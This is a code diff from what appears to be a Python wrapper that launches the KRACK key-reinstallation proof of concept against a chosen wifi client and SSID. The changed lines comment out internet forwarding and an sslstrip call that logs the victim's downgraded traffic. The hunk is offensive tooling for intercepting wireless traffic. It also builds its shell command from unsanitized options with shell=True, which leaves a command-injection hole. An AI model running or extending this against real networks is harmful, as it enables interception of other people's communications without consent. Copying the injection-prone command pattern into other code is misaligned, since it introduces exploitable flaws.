@@ -120,8 +120,8 @@ def main():
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                 # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
-                subprocess.call(["sslstrip -w sslstrip.log &"])
+                #subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
+                #subprocess.call(["sslstrip -w sslstrip.log &"])
             	attackParser()
         except KeyboardInterrupt:
             log.info("Cleaning up and restoring wifi ...")
